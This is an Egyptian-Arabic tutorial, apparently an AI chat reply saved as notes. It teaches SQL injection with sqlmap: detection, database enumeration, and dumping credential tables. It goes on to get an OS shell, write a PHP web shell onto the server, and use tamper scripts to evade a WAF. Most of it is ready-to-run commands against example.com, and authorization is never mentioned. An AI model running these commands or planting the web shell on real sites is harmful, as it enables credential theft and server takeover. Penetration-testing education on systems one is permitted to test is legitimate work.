### **1. اكتشاف الثغرة باستخدام sqlmap**
#### **إيه هو؟**
ال sqlmap بيبدأ باختبار الهدف (زي URL أو طلب POST) عشان يكتشف إذا كان فيه ثغرة SQL Injection ونوعها (Union، Blind، إلخ).

#### **ازاي بيشتغل؟**
بتديله الـ URL أو الطلب، وهو بيجرب أوامر SQL تلقائيًا ويحلل الردود.

#### **مثال عملي:**
- **اختبار URL بسيط:**
  ```
  sqlmap -u "http://example.com/product.php?id=1" --batch
  ```
  الـ `--batch` بيخليه يجاوب على الأسئلة الافتراضية تلقائيًا. لو لقى ثغرة، هيقولك "parameter 'id' is vulnerable".

- **اختبار معين لنوع الثغرة:**
  ```
  sqlmap -u "http://example.com/product.php?id=1" --technique=U
  ```
  الـ `--technique=U` بيختبر Union-Based بس.

- **اختبار POST Request:**
  لو الثغرة في فورم:
  ```
  sqlmap -u "http://example.com/login.php" --data="username=admin&password=test" --batch
  ```

#### **خلاصة طريفة:**
تخيل إنك بتبعت واحد ذكي يخبط على كل باب في البيت ويقول "في حد هنا؟"، لو الباب اتفتح يقولك "أيوة يا باشا، في ثغرة في الأوضة دي!"

---

### **2. استخراج معلومات الداتابيز**
#### **إيه هو؟**
بعد ما تكتشف الثغرة، sqlmap بيساعدك تسحب معلومات زي أسماء الداتابيز، الجداول، والأعمدة.

#### **ازاي بيشتغل؟**
بتستخدم أوامر زي `--dbs` و `--tables` عشان تجمع المعلومات خطوة بخطوة.

#### **مثال عملي:**
- **سحب أسماء الداتابيز:**
  ```
  sqlmap -u "http://example.com/product.php?id=1" --dbs
  ```
  هيرجعلك حاجة زي: `mysql, testdb, shop`.

- **سحب الجداول من داتابيز معينة:**
  ```
  sqlmap -u "http://example.com/product.php?id=1" -D testdb --tables
  ```
  ممكن يرجع: `users, products, orders`.

- **سحب الأعمدة من جدول:**
  ```
  sqlmap -u "http://example.com/product.php?id=1" -D testdb -T users --columns
  ```
  هيجيب: `id, username, password`.

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحبك "روح هاتلي كشف حساب البيت كله"، يرجعلك بيقول "في أوضة اسمها testdb، وفيها دولاب اسمه users، وجواه يوزر نيم وباسوورد!"

---

### **3. سحب البيانات (Dumping)**
#### **إيه هو؟**
sqlmap بيقدر يسحب كل البيانات من جدول معين (زي يوزر نيم وباسوورد) ويحفظهالك.

#### **ازاي بيشتغل؟**
بتستخدم `--dump` عشان تسحب كل حاجة أو تحدد عمود معين.

#### **مثال عملي:**
- **سحب كل البيانات من جدول:**
  ```
  sqlmap -u "http://example.com/product.php?id=1" -D testdb -T users --dump
  ```
  هيرجعلك حاجة زي:
  ```
  id | username | password
  1  | admin    | 12345
  2  | user1    | pass123
  ```

- **سحب عمود معين:**
  ```
  sqlmap -u "http://example.com/product.php?id=1" -D testdb -T users -C username,password --dump
  ```
  هيجيب الـ `username` و `password` بس.

- **حفظ البيانات في ملف:**
  ```
  sqlmap -u "http://example.com/product.php?id=1" -D testdb -T users --dump --output-dir=/home/user/dump
  ```

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحبك "روح هاتلي كل الفلوس من الخزنة"، يرجعلك بكشف كده "الأولاني admin ومعاه 12345، والتاني user1 ومعاه pass123"، كده الكنز بقى في جيبك!

---

### **4. تنفيذ أوامر على السيرفر**
#### **إيه هو؟**
لو الداتابيز عندها صلاحيات كافية، sqlmap بيقدر يديك شيل (Shell) تتحكم في السيرفر من خلاله.

#### **ازاي بيشتغل؟**
بتستخدم `--os-shell` أو `--file-write` عشان تكتب ملفات أو تنفذ أوامر.

#### **مثال عملي:**
- **فتح شيل:**
  ```
  sqlmap -u "http://example.com/product.php?id=1" --os-shell
  ```
  لو نجح، هيفتح prompt تكتب فيه أوامر زي `whoami` أو `ls`.

- **كتابة ملف على السيرفر:**
  ```
  sqlmap -u "http://example.com/product.php?id=1" --file-write=/home/user/shell.php --file-dest=/var/www/html/shell.php
  ```
  حط في `shell.php` كود زي:
  ```
  <?php system($_GET['cmd']); ?>
  ```
  افتح `http://example.com/shell.php?cmd=whoami`.

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحبك "روح افتحلي الباب الخلفي للبيت"، يرجعلك بيقول "الباب مفتوح وكمان كتبت تعليمات للخدامين يسمعوا كلامك"، كده بقيت الكبير!

---

### **5. تخصيص الاختبار (Advanced Options)**
#### **إيه هو؟**
sqlmap فيه خيارات متقدمة عشان تتحكم أكتر، زي اختيار نوع الثغرة أو تسريع العملية.

#### **ازاي بيشتغل؟**
بتضيف أوامر زي `--level` أو `--risk` عشان تزود قوة الاختبار.

#### **مثال عملي:**
- **زيادة العمق:**
  ```
  sqlmap -u "http://example.com/product.php?id=1" --level=3 --risk=3
  ```
  الـ `--level=3` بيختبر حاجات أعمق زي الكوكيز، والـ `--risk=3` بيجرب أوامر أخطر.

- **تسريع العملية:**
  ```
  sqlmap -u "http://example.com/product.php?id=1" --threads=10 --dbs
  ```
  الـ `--threads=10` بيستخدم 10 خيوط لتسريع المهمة.

- **تجاهل الأخطاء:**
  ```
  sqlmap -u "http://example.com/product.php?id=1" --ignore-401 --dbs
  ```
  لو فيه حماية بسيطة، بيتخطاها.

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحبك "فتش البيت كله، ولو في حيطان اضربها، وكمان اجري بسرعة"، يرجعلك بكل حاجة في ثواني زي الصاروخ!




## ممكن تعمل الامر ده مع Burp suite
انك تروح تاخد كل الكلام الي في ال Request وتحطه في ملف 
![Pasted image 20250316173403.png](attachments/Pasted image 20250316173403.png)
وبعدين تكتب الامر ده 
```
sqlmap -r اسم الملف
```


---

### **خطوات عملية للاستغلال كـ Pentester**
1. **اكتشاف الثغرة:**
   - ابدأ بـ:
     ```
     sqlmap -u "http://example.com/product.php?id=1" --batch
     ```
   - لو POST، استخدم `--data`.

2. **جمع المعلومات:**
   - اسحب الداتابيز:
     ```
     sqlmap -u "http://example.com/product.php?id=1" --dbs
     ```
   - اسحب الجداول والأعمدة:
     ```
     sqlmap -u "http://example.com/product.php?id=1" -D testdb --tables
     ```

3. **سحب البيانات:**
   - استخدم:
     ```
     sqlmap -u "http://example.com/product.php?id=1" -D testdb -T users --dump
     ```

4. **التحكم في السيرفر:**
   - جرب شيل:
     ```
     sqlmap -u "http://example.com/product.php?id=1" --os-shell
     ```
   - أو اكتب ملف:
     ```
     sqlmap -u "http://example.com/product.php?id=1" --file-write=/home/user/shell.php --file-dest=/var/www/html/shell.php
     ```

5. **تخصيص:**
   - لو الموقع بطيء، زوّد الـ threads:
     ```
     sqlmap -u "http://example.com/product.php?id=1" --threads=5 --dbs
     ```

#### **نصيحة:**
جرب كل أمر لوحده عشان تفهم الردود، واستخدم `--batch` لو عايز تسرع. لو حاسس إن في حماية زي WAF، جرب `--tamper` عشان تتخطاها.

---

ها، عايز أشرح حاجة زي `--tamper` أو أجرب معاك مثال معين؟